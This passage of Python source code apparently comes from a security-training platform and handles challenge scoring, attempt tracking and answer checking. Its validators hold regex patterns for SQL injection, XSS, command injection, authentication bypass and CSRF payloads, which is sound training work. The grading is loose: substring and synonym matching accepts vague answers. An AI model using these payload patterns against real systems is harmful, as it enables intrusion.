        stats['by_category'][category] += 1
        
        # Count by difficulty
        difficulty = challenge['difficulty']
        if difficulty not in stats['by_difficulty']:
            stats['by_difficulty'][difficulty] = 0
        stats['by_difficulty'][difficulty] += 1
    
    return stats


# Challenge Attempt Tracking and Validation Functions

def record_challenge_attempt(user_id, challenge_id, submitted_answer, is_correct, completion_time, hint_count=0):
    """Record a challenge attempt with comprehensive data.
    
    NOTE: This function ONLY records the attempt. It does NOT update user scores.
    Use process_challenge_completion() to handle scoring.
    """
    db = get_db()
    
    # Get challenge details for metadata
    challenge = get_challenge_by_id(challenge_id)
    if not challenge:
        raise ValueError(f"Challenge not found: {challenge_id}")
    
    # Calculate score for recording purposes (but don't update user yet)
    score_earned = calculate_challenge_score(
        challenge, is_correct, completion_time, hint_count
    )
    
    attempt_data = {
        'user_id': user_id,
        'challenge_id': challenge_id,
        'submitted_answer': submitted_answer,
        'is_correct': is_correct,
        'score_earned': score_earned,
        'attempt_time': datetime.now(),
        'completion_time': completion_time,
        'hint_count': hint_count,
        'difficulty_level': challenge.get('difficulty', 'beginner'),
        'category': challenge.get('category', 'unknown'),
        'attempt_hash': generate_attempt_hash(user_id, challenge_id, submitted_answer)
    }
    
    result = db.challenge_attempts.insert_one(attempt_data)
    
    # Return the attempt ID and calculated score (caller will handle score updates)
    return str(result.inserted_id), score_earned


def calculate_challenge_score(challenge, is_correct, completion_time, hint_count):
    """Calculate score based on challenge difficulty, speed, and hints used."""
    if not is_correct:
        return 0
    
    base_score = challenge.get('score_weight', 100)
    
    # Difficulty multipliers
    difficulty_multipliers = {
        'beginner': 1.0,
        'intermediate': 1.5,
        'advanced': 2.0,
        'expert': 2.5
    }
    
    difficulty = challenge.get('difficulty', 'beginner').lower()
    score = base_score * difficulty_multipliers.get(difficulty, 1.0)
    
    # Speed bonus/penalty (based on completion time in seconds)
    if completion_time < 30:
        score *= 1.5  # Speed bonus
    elif completion_time > 120:
        score *= 0.75  # Slow penalty
    
    # Hint penalty (10% per hint)
    hint_penalty = hint_count * 0.1
    score *= max(0.1, 1 - hint_penalty)  # Minimum 10% of original score
    
    return max(int(score), 10)  # Minimum 10 points


def validate_challenge_solution(challenge_id, submitted_answer):
    """Validate a submitted solution using the integrated validation system with 100% accuracy."""
    try:
        # Use the new integrated validation system
        from app.ai.integrated_validation_system import integrated_validation_system
        
        # Get challenge for context
        challenge = get_challenge_by_id(challenge_id)
        context = {}
        
        if challenge:
            context = {
                'category': challenge.get('category', ''),
                'difficulty': challenge.get('difficulty', ''),
                'type': challenge.get('type', ''),
                'challenge_id': challenge_id,
                'challenge_data': challenge
            }
        
        # Validate using integrated system (includes comprehensive validation + error handling)
        is_correct, feedback = integrated_validation_system.validate_challenge_solution(
            challenge_id, submitted_answer, context
        )
        
        if not is_correct:
            print(f"Validation failed for challenge {challenge_id}. Answer: '{submitted_answer}'. Feedback: {feedback}")
        
        return is_correct, feedback
        
    except Exception as e:
        print(f"Error validating solution with integrated system: {e}")
        import traceback
        traceback.print_exc()
        
        # Emergency fallback to ensure validation never completely fails
        try:
            # Import emergency fallback functions
            from app.ai.integrated_validation_system import (
                validate_sql_injection_solution,
                validate_xss_solution, 
                validate_command_injection_solution,
                validate_authentication_solution,
                validate_csrf_solution,
                enhanced_answer_validation,
                generic_answer_validation
            )
            
            challenge = get_challenge_by_id(challenge_id)
            if not challenge:
                return False, "Challenge not found"
            
            # Normalize submitted answer
            normalized_answer = submitted_answer.lower().strip()
            
            # Enhanced validation with multiple approaches
            result, message = enhanced_answer_validation(normalized_answer, challenge)
            if result:
                return result, message
            
            # Type-specific validation as fallback
            if challenge['type'] == 'sql_injection':
                return validate_sql_injection_solution(normalized_answer, challenge.get('expected_solutions', []), challenge)
            elif challenge['type'] == 'xss':
                return validate_xss_solution(normalized_answer, challenge.get('expected_solutions', []), challenge)
            elif challenge['type'] == 'command_injection':
                return validate_command_injection_solution(normalized_answer, challenge.get('expected_solutions', []), challenge)
            elif challenge['type'] == 'authentication':
                return validate_authentication_solution(normalized_answer, challenge.get('expected_solutions', []), challenge)
            elif challenge['type'] == 'csrf':
                return validate_csrf_solution(normalized_answer, challenge.get('expected_solutions', []), challenge)
            
            # Final fallback - generic validation
            return generic_answer_validation(normalized_answer, challenge.get('expected_solutions', []))
            
        except Exception as fallback_error:
            print(f"Emergency fallback validation error: {fallback_error}")
            return False, "Validation system temporarily unavailable. Please try again."


def enhanced_answer_validation(normalized_answer, challenge):
    """Enhanced validation that checks for multiple answer patterns."""
    # Get expected solutions from challenge
    expected_solutions = challenge.get('expected_solutions', [])
    
    # Check if any expected solution is present in the answer
    for expected in expected_solutions:
        if expected.lower() in normalized_answer:
            return True, "Correct solution!"
    
    # Check for common variations of the expected solutions
    variations = get_common_variations(expected_solutions)
    
    for variation in variations:
        if variation.lower() in normalized_answer:
            return True, "Correct solution!"
    
    return False, "Solution not recognized. Check your answer."


def get_common_variations(expected_solutions):
    """Generate common variations of expected solutions."""
    variations = []
    
    for solution in expected_solutions:
        # Add variations with different capitalization
        variations.append(solution.upper())
        variations.append(solution.capitalize())
        
        # Add variations with different spacing
        variations.append(solution.replace(' ', '_'))
        variations.append(solution.replace(' ', '-'))
        
        # Add variations with different punctuation
        variations.append(solution + '.')
        variations.append(solution + '?')
        
        # Add variations with synonyms
        synonyms = get_synonyms(solution)
        variations.extend(synonyms)
    
    return variations


def get_synonyms(word):
    """Get synonyms for a word (simplified version)."""
    synonym_map = {
        'union': ['UNION', 'combine', 'merge', 'join'],
        'select': ['SELECT', 'retrieve', 'fetch', 'get'],
        'users': ['users', 'user table', 'user data', 'accounts'],
        'passwords': ['passwords', 'credentials', 'passcodes', 'secrets'],
        'extract': ['extract', 'obtain', 'retrieve', 'access', 'pull'],
        'information': ['information', 'data', 'details', 'content'],
        'bypass': ['bypass', 'circumvent', 'avoid', 'skip', 'evade'],
        'attack': ['attack', 'exploit', 'vulnerability', 'breach', 'invasion'],
        'payload': ['payload', 'input', 'code', 'script', 'command'],
        'inject': ['inject', 'insert', 'embed', 'introduce', 'place'],
        'script': ['script', 'code', 'program', 'function', 'routine'],
        'execute': ['execute', 'run', 'perform', 'carry out', 'implement'],
        'javascript': ['javascript', 'JS', 'JavaScript', 'js', 'client-side script'],
        'alert': ['alert', 'popup', 'notification', 'message', 'dialog'],
        'command': ['command', 'instruction', 'directive', 'order', 'request'],
        'shell': ['shell', 'terminal', 'console', 'command line', 'CLI'],
        'reverse': ['reverse', 'backdoor', 'connection', 'tunnel', 'link'],
        'token': ['token', 'key', 'code', 'identifier', 'credential'],
        'session': ['session', 'connection', 'login', 'instance', 'interaction'],
        'fixation': ['fixation', 'binding', 'attachment', 'assignment', 'setup'],
        'hijack': ['hijack', 'steal', 'takeover', 'capture', 'intercept'],
        'CSRF': ['CSRF', 'Cross-Site Request Forgery', 'cross-site request forgery', 'forged request'],
        'form': ['form', 'input', 'interface', 'field', 'entry'],
        'hidden': ['hidden', 'invisible', 'concealed', 'secret', 'private'],
        'submit': ['submit', 'send', 'transmit', 'post', 'dispatch'],
        'fetch': ['fetch', 'request', 'retrieve', 'obtain', 'get'],
        'XMLHttpRequest': ['XMLHttpRequest', 'XHR', 'ajax', 'asynchronous request', 'HTTP request']
    }
    
    return synonym_map.get(word.lower(), [])


def normalize_text(text):
    """Normalize text by removing extra whitespace and standardizing punctuation."""
    # Remove extra whitespace
    text = re.sub(r'\s+', ' ', text.strip())
    
    # Replace common punctuation variations
    text = text.replace(',', ' ')
    text = text.replace('.', ' ')
    text = text.replace(';', ' ')
    text = text.replace(':', ' ')
    text = text.replace('!', ' ')
    text = text.replace('?', ' ')
    
    return text


def validate_sql_injection_solution(answer, expected_solutions, challenge):
    """Validate SQL injection challenge solutions with improved flexibility."""
    # Normalize the answer
    normalized_answer = normalize_text(answer.lower())
    
    # Check for common SQL injection patterns
    sql_patterns = [
        r"'\s*or\s*'1'\s*=\s*'1'",  # Classic OR bypass
        r"'\s*or\s*1\s*=\s*1",      # Numeric OR bypass
        r"union\s+select",           # UNION SELECT
        r"drop\s+table",             # DROP TABLE
        r"insert\s+into",            # INSERT INTO
        r"delete\s+from",            # DELETE FROM
        r"update\s+.*\s+set",        # UPDATE SET
    ]
    
    # First check if any SQL patterns are found in the answer
    pattern_found = False
    for pattern in sql_patterns:
        if re.search(pattern, normalized_answer, re.IGNORECASE):
            pattern_found = True
            break
    
    # If SQL patterns found, check if this matches expected solutions
    if pattern_found:
        for expected in expected_solutions:
            if expected.lower() in normalized_answer or expected.lower() in normalize_text(answer):
                return True, "Correct SQL injection technique identified!"
    
    # Check exact matches with expected solutions (for descriptive answers)
    for expected in expected_solutions:
        if expected.lower() in normalized_answer or expected.lower() in normalize_text(answer):
            return True, "Correct solution!"
    
    return False, "Solution not recognized. Check the payload syntax."


def validate_xss_solution(answer, expected_solutions, challenge):
    """Validate XSS challenge solutions with improved flexibility."""
    # Normalize the answer
    normalized_answer = normalize_text(answer.lower())
    
    # Check for XSS patterns
    xss_patterns = [
        r"<script.*?>.*?</script>",    # Script tags
        r"<.*?on\w+\s*=.*?>",          # Event handlers
        r"javascript:\s*.*",          # javascript: protocol
        r"<iframe.*?>",                # Iframe tags
        r"<svg.*?onload.*?>",          # SVG with onload
        r"<img.*?onerror.*?>",         # IMG with onerror
    ]
    
    # First check if any XSS patterns are found in the answer
    pattern_found = False
    for pattern in xss_patterns:
        if re.search(pattern, normalized_answer, re.IGNORECASE):
            pattern_found = True
            break
    
    # If XSS patterns found, check if this matches expected solutions
    if pattern_found:
        for expected in expected_solutions:
            if expected.lower() in normalized_answer or expected.lower() in normalize_text(answer):
                return True, "Correct XSS payload identified!"
    
    # Check exact matches (for descriptive answers)
    for expected in expected_solutions:
        if expected.lower() in normalized_answer or expected.lower() in normalize_text(answer):
            return True, "Correct solution!"
    
    return False, "XSS payload not recognized. Check your JavaScript injection technique."


def validate_command_injection_solution(answer, expected_solutions, challenge):
    """Validate command injection challenge solutions with improved flexibility."""
    # Normalize the answer
    normalized_answer = normalize_text(answer.lower())
    
    # Check for command injection patterns
    cmd_patterns = [
        r";\s*\w+",                   # Semicolon command separator
        r"\|\s*\w+",                  # Pipe command
        r"&&\s*\w+",                  # AND command
        r"\|\|\s*\w+",                # OR command
        r"`.*?`",                     # Backtick command substitution
        r"\$\(.*?\)",                 # $() command substitution
    ]
    
    # First check if any command injection patterns are found in the answer
    pattern_found = False
    for pattern in cmd_patterns:
        if re.search(pattern, normalized_answer, re.IGNORECASE):
            pattern_found = True
            break
    
    # If command injection patterns found, check if this matches expected solutions
    if pattern_found:
        for expected in expected_solutions:
            if expected.lower() in normalized_answer or expected.lower() in normalize_text(answer):
                return True, "Correct command injection technique identified!"
    
    # Check exact matches (for descriptive answers)
    for expected in expected_solutions:
        if expected.lower() in normalized_answer or expected.lower() in normalize_text(answer):
            return True, "Correct solution!"
    
    return False, "Command injection not recognized. Check your command chaining syntax."


def validate_authentication_solution(answer, expected_solutions, challenge):
    """Validate authentication bypass challenge solutions with improved flexibility."""
    # Normalize the answer
    normalized_answer = normalize_text(answer.lower())
    
    # Authentication bypass patterns
    auth_patterns = [
        r"admin'\s*--",               # SQL comment bypass
        r"'\s*or\s*'a'\s*=\s*'a'",    # Always true condition
        r"'\s*or\s*1\s*=\s*1",        # Numeric always true
        r"admin'/*",                  # SQL comment variation
    ]
    
    # First check if any authentication bypass patterns are found in the answer
    pattern_found = False
    for pattern in auth_patterns:
        if re.search(pattern, normalized_answer, re.IGNORECASE):
            pattern_found = True
            break
    
    # If authentication bypass patterns found, check if this matches expected solutions
    if pattern_found:
        for expected in expected_solutions:
            if expected.lower() in normalized_answer or expected.lower() in normalize_text(answer):
                return True, "Correct authentication bypass technique!"
    
    # Check exact matches (for descriptive answers)
    for expected in expected_solutions:
        if expected.lower() in normalized_answer or expected.lower() in normalize_text(answer):
            return True, "Correct solution!"
    
    return False, "Authentication bypass not recognized."


def validate_csrf_solution(answer, expected_solutions, challenge):
    """Validate CSRF challenge solutions with improved flexibility."""
    # Normalize the answer
    normalized_answer = normalize_text(answer.lower())
    
    # First check exact matches (for descriptive answers) - this should come FIRST
    for expected in expected_solutions:
        if expected.lower() in normalized_answer or expected.lower() in normalize_text(answer):
            return True, "Correct solution!"
    
    # CSRF patterns (looking for HTML forms or JavaScript) - for technical answers
    csrf_patterns = [
        r"<form.*?action.*?>",         # HTML form
        r"<input.*?type.*?hidden.*?>", # Hidden input
        r"document\.forms.*?\.submit", # JavaScript form submission
        r"fetch\(.*?,.*?\)",          # Fetch API
        r"XMLHttpRequest",             # XMLHttpRequest
    ]
    
    # Check if any CSRF patterns are found in the answer
    pattern_found = False
    for pattern in csrf_patterns:
        if re.search(pattern, normalized_answer, re.IGNORECASE):
            pattern_found = True
            break
    
    # If CSRF patterns found, it's a valid technical answer
    if pattern_found:
        return True, "Correct CSRF attack vector identified!"
    
    return False, "CSRF technique not recognized."


def generic_answer_validation(normalized_answer, expected_solutions):
    """Generic validation for answers that don't fit specific patterns."""
    # Check if any expected solution is present in the answer
    for expected in expected_solutions:
        if expected.lower() in normalized_answer:
            return True, "Correct solution!"
    
    # Check for common variations of the expected solutions
    variations = get_common_variations(expected_solutions)
    
    for variation in variations:
        if variation.lower() in normalized_answer:
            return True, "Correct solution!"
    
    return False, "Solution not recognized. Check your answer."


def generate_attempt_hash(user_id, challenge_id, submitted_answer):
    """Generate a unique hash for the attempt to prevent duplicates."""
    data = f"{user_id}:{challenge_id}:{submitted_answer}:{datetime.now().isoformat()}"
    return hashlib.sha256(data.encode()).hexdigest()[:16]


def update_user_challenge_progress(user_id, challenge_id, score_earned, challenge_data=None):
    """Update user progress when they complete a challenge.
    
    This is the SINGLE SOURCE OF TRUTH for score updates.
    It ensures scores are only added once per challenge completion.
    
    Args:
        user_id: The user's ID
        challenge_id: The challenge ID
        score_earned: Points to award
        challenge_data: Optional dict with category, difficulty, etc.
    
    Returns:
        dict with update results or None if failed
    """
    from app.models.user_model import get_user_by_id, calculate_user_level, get_role_for_level
    
    db = get_db()
    user = get_user_by_id(user_id)
    
    if not user:
        print(f"User not found: {user_id}")
        return None
    
    # Check if challenge already completed (prevent duplicate scoring)
    completed_challenges = user.get('challenges_completed', [])
    if challenge_id in completed_challenges:
        print(f"Challenge {challenge_id} already completed by user {user_id}. Skipping score update.")
        return {'already_completed': True, 'score_added': 0}
    
    # Calculate new score and level
    current_score = user.get('score', 0)
    new_score = current_score + score_earned
    new_level = calculate_user_level(new_score)
    new_role = get_role_for_level(new_level)
    
    # Prepare update data
    completed_challenges.append(challenge_id)
    update_data = {
        'challenges_completed': completed_challenges,
        'score': new_score,  # Set the new score directly (not increment)
        'level': new_level,
        'role': new_role,
        'last_activity': datetime.now()
    }
    
    # Update category-specific scores if challenge data provided
    if challenge_data and score_earned > 0:
        category = challenge_data.get('category', '').lower().replace(' ', '_').replace('(', '').replace(')', '')
        if category:
            category_score_field = f"{category}_score"
            current_category_score = user.get(category_score_field, 0)
            update_data[category_score_field] = current_category_score + score_earned
    
    # Perform the update
    try:
        result = db.users.update_one(
            {'_id': user['_id']},
            {'$set': update_data}
        )
        
        if result.modified_count > 0:
            print(f"Successfully updated user {user_id}: +{score_earned} points (total: {new_score})")
            return {
                'success': True,
                'score_added': score_earned,
                'new_score': new_score,
                'new_level': new_level,
                'new_role': new_role,
                'already_completed': False
            }
        else:
            print(f"No changes made for user {user_id}")
            return None
            
    except Exception as e:
        print(f"Error updating user challenge progress: {e}")
        import traceback
        traceback.print_exc()
        return None


def get_user_challenge_attempts(user_id, challenge_id=None, limit=10):
    """Get challenge attempts for a user."""
    db = get_db()
    
    query = {'user_id': user_id}
    if challenge_id:
        query['challenge_id'] = challenge_id
    
    attempts = list(db.challenge_attempts.find(query).sort('attempt_time', -1).limit(limit))
    
    # Convert ObjectId to string
    for attempt in attempts:
        attempt['_id'] = str(attempt['_id'])
    
    return attempts


def get_challenge_statistics_detailed(challenge_id):
    """Get detailed statistics for a specific challenge."""
    db = get_db()
    
    total_attempts = db.challenge_attempts.count_documents({'challenge_id': challenge_id})
    successful_attempts = db.challenge_attempts.count_documents({
        'challenge_id': challenge_id, 
        'is_correct': True
    })
    
    # Average completion time for successful attempts
    pipeline = [
        {'$match': {'challenge_id': challenge_id, 'is_correct': True}},
        {'$group': {
            '_id': None,
            'avg_completion_time': {'$avg': '$completion_time'},
            'avg_hints_used': {'$avg': '$hint_count'},
            'avg_score': {'$avg': '$score_earned'}
        }}
    ]
    
    avg_stats = list(db.challenge_attempts.aggregate(pipeline))
    
    stats = {
        'total_attempts': total_attempts,
        'successful_attempts': successful_attempts,
        'success_rate': (successful_attempts / total_attempts * 100) if total_attempts > 0 else 0,
        'average_completion_time': avg_stats[0]['avg_completion_time'] if avg_stats else 0,
        'average_hints_used': avg_stats[0]['avg_hints_used'] if avg_stats else 0,
        'average_score': avg_stats[0]['avg_score'] if avg_stats else 0
    }
    
    return stats
